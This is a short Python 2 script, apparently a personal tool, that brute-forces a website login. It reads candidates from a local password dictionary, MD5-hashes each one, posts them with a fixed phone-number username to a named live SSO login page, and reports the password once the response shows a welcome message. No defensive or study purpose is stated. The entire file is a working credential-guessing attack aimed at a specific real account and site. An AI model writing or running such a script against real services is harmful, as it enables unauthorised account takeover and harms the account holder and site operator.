# encoding:utf-8
# author:wwg
import threading
import time
import urllib2, httplib, urllib, sys, cookielib, Cookie
import hashlib
import threading
import time
#处理登录接口：访问登录接口后如果有301跳转，则可以使用带cookie的方式去处理
data=open("F:\\passwordDict.txt","r")
# data=open("F:\\wwg.txt","r")
while True:
    try:
        start_time=time.time()
        lines=data.readline()
        time.sleep(1)
        # print lines.__len__()
        mm=lines[:-1]
        # print mm.__len__()
        print "明文密码为：%s" %mm
        m=hashlib.md5()
        m.update(mm)
        psw = m.hexdigest()
        print "加密后的密码为：%s" %psw
        post_url="http://sso.huaqinwang.com/mall/login.shtml"
        cj = cookielib.CookieJar()
        # print cj
        opener=urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
        urllib2.install_opener(opener)
        resp = urllib2.urlopen(post_url)
        # post_url="http://192.168.10.5:1101/chinaClearingNotify/mock13X8.do"
        first_post_data={"targetUrl":"",
                         "queryParams":"",
                         "loginCount":"1",
                         "isMemoried":"0@knet.cn",
                         "userName":"18638135380",
                         "password":psw,
                         "code":"ooxx"}
        post_data=urllib.urlencode(first_post_data)
        req=urllib2.Request(post_url,post_data)
        rep=urllib2.urlopen(req)
        result=rep.read()
        # print result
        if '欢迎您登录' in result:
            print "正确的密码已经找到，密码为：%s" %mm
            break
        else:
            print "密码错误"
        end_time=time.time()
        cost_time=end_time-start_time
        print "本次执行耗费时间为：%s" %cost_time
        print "-----------------------------------------------------------------------"
        print ""

    except:
        print "已捕获一个异常，异常明文密码为：%s" %mm
data.close()
